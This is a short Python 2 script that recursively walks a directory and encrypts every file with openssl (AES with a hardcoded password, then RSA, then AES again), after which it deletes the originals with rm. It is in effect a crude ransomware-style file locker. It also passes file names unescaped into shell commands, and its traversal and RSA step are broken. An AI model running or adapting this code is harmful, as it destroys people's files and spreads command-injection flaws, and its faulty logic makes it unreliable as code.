import os,sys

aes_password="ricardo"
keypath="/home/test2/random/keys"

def encrypt_(fname):
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
	os.system("openssl rsautl -encrypt -pubin -inkey "+keypath+"/public.pem -in "+fname+".aes -out "+fname+".rsa")
	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
	os.system("rm "+fname+".aes")
	os.system("rm "+fname+".rsa")
	os.system("rm "+fname)


def loop(looped_dir):
	for root, directories, filenames in os.walk(looped_dir):
		for directory in directories:
			dir=os.path.join(root, directory)
			#print "Directory:",dir
			loop(dir)
	for filename in filenames:
		fname=os.path.join(root,filename)
		print "File:",fname
		encrypt_(fname)

loop(sys.argv[1])
